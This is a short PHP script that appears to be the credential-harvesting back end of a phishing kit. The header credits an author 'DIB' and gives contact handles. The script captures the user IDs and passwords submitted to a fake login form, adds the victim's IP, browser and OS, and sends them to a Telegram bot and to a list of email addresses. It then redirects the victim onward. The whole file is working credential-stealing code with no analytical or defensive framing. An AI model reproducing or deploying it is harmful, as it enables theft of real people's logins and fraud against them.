<?php
/*

Author : DIB
Email : b41tsm@gmail.com
ICQ : @MorrisWorm

*/
if(isset($_POST['user_id']) && isset($_POST['Pass'])){
	
include "../config.php";
include "funcs.php";

$user = $_POST['user_id'];
$password =  $_POST['Pass'];

$message = "\n----\nID: $user\nPassword: $password\nOS : ".getOs($_SERVER['HTTP_USER_AGENT'])."\nBrowser: ".getBrowser($_SERVER['HTTP_USER_AGENT'])."\nIP : $ip\nAgent: ".$_SERVER['HTTP_USER_AGENT']."\n----\n";
toTG($message);
$headers = "From: DIB  <noreply@moneyteam.DIB>";
$headers .= "MIME-Version: 1.0\n";
//$headers .= "Content-type: text/html; charset=UTF-8\n";
$subject = "NEW SG [LOGIN] INFO from $ip";

$emaillist = explode(',',$to);

foreach($emaillist as $email){
mail($email,$subject,$message,$headers);
}

echo "<meta http-equiv=\"Refresh\" content=\"0; url=../tel.php\" />";



}
?>